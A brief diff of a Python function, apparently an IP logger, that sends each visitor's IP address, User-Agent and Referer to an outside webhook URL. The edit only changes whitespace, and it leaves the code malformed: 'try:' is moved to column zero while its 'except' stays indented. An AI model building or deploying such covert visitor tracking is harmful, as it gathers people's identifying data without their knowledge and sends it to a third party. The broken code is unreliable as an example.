@@ -30,8 +30,8 @@ def log_ip():
 data = {
     "content": f"**IP-LOG:** {ip} | {request.headers.get('User-Agent')}\n**Referer:** {referer}"
 }
-    
-    try:
+
+try:
         r = requests.post(WEBHOOK_URL, json=data, timeout=10)
         print("Webhook Status:", r.status_code)
     except Exception as e:
